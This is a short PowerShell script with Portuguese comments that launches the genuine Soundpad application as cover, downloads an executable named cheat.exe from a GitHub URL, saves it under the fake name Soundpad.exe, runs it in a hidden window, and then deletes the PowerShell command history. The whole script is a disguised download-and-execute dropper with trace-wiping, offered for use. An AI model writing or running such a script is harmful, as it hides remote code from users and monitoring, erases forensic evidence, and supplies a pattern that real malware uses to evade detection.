# CONFIGURAÇÕES
$CheatUrl = "https://raw.githubusercontent.com/enzin762/wasd/main/cheat.exe" # Seu cheat x64
$TempPath = "$env:TEMP\Soundpad.exe" # Nome camuflado para o Gerenciador de Tarefas

Write-Host "[+] Iniciando seguranca..." -ForegroundColor Cyan

# 1. Localizar o Soundpad original automaticamente
$SoundpadPath = "C:\Program Files (x86 )\Steam\steamapps\common\Soundpad\Soundpad.exe"
if (-not (Test-Path $SoundpadPath)) {
    $SteamPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue
    if ($SteamPath) { $SoundpadPath = "$($SteamPath.InstallPath)\steamapps\common\Soundpad\Soundpad.exe" }
}

# 2. Iniciar o Soundpad original (se existir)
if (Test-Path $SoundpadPath) {
    Write-Host "[+] Abrindo Soundpad original..." -ForegroundColor Green
    Start-Process $SoundpadPath
}

# 3. Baixar e iniciar o seu Cheat x64 (com nome falso)
Invoke-WebRequest -Uri $CheatUrl -OutFile $TempPath -UseBasicParsing
Write-Host "[+] Abrindo Cheat camuflado..." -ForegroundColor Green
Start-Process $TempPath -WindowStyle Hidden

# 4. Limpar rastro do PowerShell
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Write-Host "[OK] Sucesso!" -ForegroundColor Cyan
